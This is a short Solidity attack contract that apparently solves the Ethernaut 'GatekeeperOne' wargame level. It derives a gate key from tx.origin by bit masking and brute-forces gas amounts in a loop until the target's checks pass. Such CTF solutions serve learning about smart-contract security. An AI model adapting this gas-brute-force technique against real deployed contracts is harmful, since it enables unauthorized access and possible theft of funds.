// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttack {
    IGatekeeperOne public target;

    constructor(address _target) {
        target = IGatekeeperOne(_target);
    }

    function attack() external {
        bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;

        for (uint256 i = 0; i < 8191; i++) {
            (bool success, ) = address(target).call{gas: i + (8191 * 3)}(
                abi.encodeWithSignature("enter(bytes8)", key)
            );

            if (success) {
                break;
            }
        }
    }
}